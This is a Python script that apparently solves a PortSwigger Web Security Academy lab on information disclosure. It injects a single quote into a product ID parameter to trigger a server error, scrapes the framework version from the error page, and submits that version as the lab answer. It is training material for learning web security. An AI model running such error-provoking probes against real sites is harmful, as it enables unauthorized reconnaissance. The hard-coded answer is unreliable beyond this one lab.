####################################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 2/9/2023
#
# Lab: Information disclosure in error messages
#
# Steps: 1. Inject a single quote in the product ID parameter to cause an error
#        2. Extract the framework name
#        3. Submit solution
#
####################################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore

# change this url to your lab
url = "https://0a3600d603f62f3580f894800013003a.web-security-academy.net"

try:
    inject_payload = requests.get(
        f"{url}/product?productId=4'")  # inject the payload
    if inject_payload.status_code == 500:  # if error occur
        print(Fore.WHITE + "1. Injecting the payload.. " + Fore.GREEN + "OK")
        framework_name = re.findall("Apache Struts 2 2.3.31",
                                    inject_payload.text)[0]  # extract the framework name; change this if it's changed in you cases
        print(Fore.WHITE + "2. Extracting the framework name.. " +
              Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + framework_name)
        data = {
            "answer": framework_name
        }
        try:
            submit_answer = requests.post(
                f"{url}/submitsolution", data)  # submit solution
            if submit_answer.status_code == 200:
                print(Fore.WHITE + "3. Submitting solution.. " + Fore.GREEN + "OK")
                print(
                    Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
        except:
            print(Fore.RED + "[!] Failed to submit solution")
except:
    print(Fore.RED + "[!] Failed to inject the payload")
